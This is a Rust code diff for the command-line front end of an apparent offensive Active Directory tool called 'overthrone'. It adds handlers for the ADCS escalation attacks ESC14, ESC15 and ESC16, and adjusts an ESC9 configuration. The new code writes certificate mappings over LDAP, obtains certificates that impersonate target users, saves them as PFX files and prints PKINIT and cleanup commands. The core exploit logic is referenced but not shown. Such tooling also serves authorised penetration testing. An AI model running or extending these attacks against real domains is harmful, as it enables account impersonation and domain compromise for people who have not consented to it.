@@ -2262,8 +2262,9 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             };
 
             let config = overthrone_core::adcs::Esc9Config {
+                ca_server: ca.to_string(),
                 template: template.clone(),
-                victim_account: victim.clone(),
+                victim: victim.clone(),
                 victim_dn: victim_dn.clone().unwrap_or_default(),
                 original_upn: original_upn.clone(),
                 target_upn: target_upn.clone(),
@@ -2654,6 +2655,192 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 }
                 Err(e) => {
                     banner::print_fail(&format!("ESC13 attack failed: {}", e));
+                    return 1;
+                }
+            }
+        }
+        AdcsAction::Esc14 {
+            target_dn,
+            target_sam,
+            mapping,
+            dc,
+            live,
+        } => {
+            println!(
+                "  {} Assessing ESC14 attack (altSecurityIdentities Mapping)...",
+                "▸".bright_black()
+            );
+            println!("    Target DN: {}", target_dn.cyan());
+            println!("    Target SAM: {}", target_sam.cyan());
+            println!("    Mapping: {}", mapping.cyan());
+
+            let mut config = overthrone_core::adcs::Esc14Config {
+                target_dn: target_dn.clone(),
+                target_sam: target_sam.clone(),
+                mapping_value: mapping.clone(),
+                mapping_style: overthrone_core::adcs::MappingStyle::Rfc822,
+                dc_host: dc.clone().unwrap_or_else(|| "DC.DOMAIN.LOCAL".to_string()),
+                domain: "DOMAIN.LOCAL".to_string(),
+                use_ldaps: false,
+            };
+
+            let exploiter = overthrone_core::adcs::Esc14Exploiter::new();
+
+            if *live {
+                let creds = match crate::require_creds(cli) {
+                    Ok(c) => c,
+                    Err(e) => return e,
+                };
+                let dc_host = match dc {
+                    Some(d) => d.clone(),
+                    None => match crate::require_dc(cli) {
+                        Ok(d) => d,
+                        Err(e) => return e,
+                    },
+                };
+
+                config.dc_host = dc_host;
+                config.domain = creds.domain.clone();
+
+                let password = creds.password().unwrap_or("");
+                match exploiter
+                    .exploit_with_ldap(&config, &creds.username, password)
+                    .await
+                {
+                    Ok(result) => {
+                        println!("\n  {} Mapping written successfully via LDAP!", "✓".green());
+                        println!("    PKINIT: {}", result.pkinit_command.cyan());
+                        println!("    Impact: {}", result.impact_description.yellow());
+                        println!("\n  {} CLEANUP COMMAND:", "i".dimmed());
+                        println!("{}", result.cleanup_command.dimmed());
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("ESC14 live attack failed: {}", e));
+                        return 1;
+                    }
+                }
+            } else {
+                match exploiter.assess(&config) {
+                    Ok(result) => {
+                        println!("\n  {} ESC14 Guidance Generated:", "▸".bright_black());
+                        for step in result.guidance {
+                            println!("    {}", step);
+                        }
+                        println!("\n  {} PKINIT Command Template:", "▸".bright_black());
+                        println!("    {}", result.pkinit_command.cyan());
+                        println!("\n  {} CLEANUP COMMAND:", "i".dimmed());
+                        println!("{}", result.cleanup_command.dimmed());
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("ESC14 assessment failed: {}", e));
+                        return 1;
+                    }
+                }
+            }
+        }
+        AdcsAction::Esc15 {
+            ca,
+            template,
+            target_user,
+            output,
+        } => {
+            println!(
+                "  {} Executing ESC15 attack (Schema V1 EKUwu abuse)...",
+                "▸".bright_black()
+            );
+            println!("    CA: {}", ca.cyan());
+            println!("    Template: {}", template.cyan());
+            println!("    Target: {}", target_user.cyan());
+
+            let exploiter = match overthrone_core::adcs::Esc15Exploiter::new(ca) {
+                Ok(e) => e,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to create ESC15 exploiter: {}", e));
+                    return 1;
+                }
+            };
+
+            let creds = crate::require_creds_silent(cli).unwrap_or_default();
+            let config = overthrone_core::adcs::Esc15Config {
+                ca_server: ca.clone(),
+                template: template.clone(),
+                target_user: target_user.clone(),
+                domain: creds.domain,
+            };
+
+            match exploiter.exploit(&config).await {
+                Ok(result) => {
+                    if let Err(e) = tokio::fs::write(output, &result.certificate.pfx_data).await {
+                        banner::print_fail(&format!("Failed to write PFX: {}", e));
+                        return 1;
+                    }
+                    println!("\n  {} Certificate obtained via ESC15!", "✓".green());
+                    println!("    Saved to: {}", output.cyan());
+                    println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
+                    println!("    PKINIT: {}", result.pkinit_command.cyan());
+                    println!("    Impact: {}", result.impact_description.yellow());
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("ESC15 attack failed: {}", e));
+                    return 1;
+                }
+            }
+        }
+        AdcsAction::Esc16 {
+            ca,
+            template,
+            target_upn,
+            victim,
+            original_upn,
+            ldap_url,
+            output,
+        } => {
+            println!(
+                "  {} Executing ESC16 attack (NO_SECURITY_EXTENSION abuse)...",
+                "▸".bright_black()
+            );
+            println!("    CA: {}", ca.cyan());
+            println!("    Template: {}", template.cyan());
+            println!("    Target UPN: {}", target_upn.cyan());
+            println!("    Victim: {}", victim.cyan());
+
+            let exploiter = match overthrone_core::adcs::Esc16Exploiter::new(ca) {
+                Ok(e) => e,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to create ESC16 exploiter: {}", e));
+                    return 1;
+                }
+            };
+
+            let creds = crate::require_creds_silent(cli).unwrap_or_default();
+            let config = overthrone_core::adcs::Esc16Config {
+                ca_server: ca.clone(),
+                template: template.clone(),
+                target_upn: target_upn.clone(),
+                victim: victim.clone(),
+                original_upn: original_upn.clone(),
+                domain: creds.domain,
+                ldap_url: ldap_url.clone(),
+            };
+
+            match exploiter.exploit(&config).await {
+                Ok(result) => {
+                    if let Err(e) = tokio::fs::write(output, &result.certificate.pfx_data).await {
+                        banner::print_fail(&format!("Failed to write PFX: {}", e));
+                        return 1;
+                    }
+                    println!("\n  {} Certificate obtained via ESC16!", "✓".green());
+                    println!("    Saved to: {}", output.cyan());
+                    println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
+                    println!("    PKINIT: {}", result.pkinit_command.cyan());
+                    println!("    Impact: {}", result.impact_description.yellow());
+                    println!("\n  {} CLEANUP COMMANDS:", "i".dimmed());
+                    for cmd in result.cleanup_commands {
+                        println!("{}", cmd.dimmed());
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("ESC16 attack failed: {}", e));
                     return 1;
                 }
             }
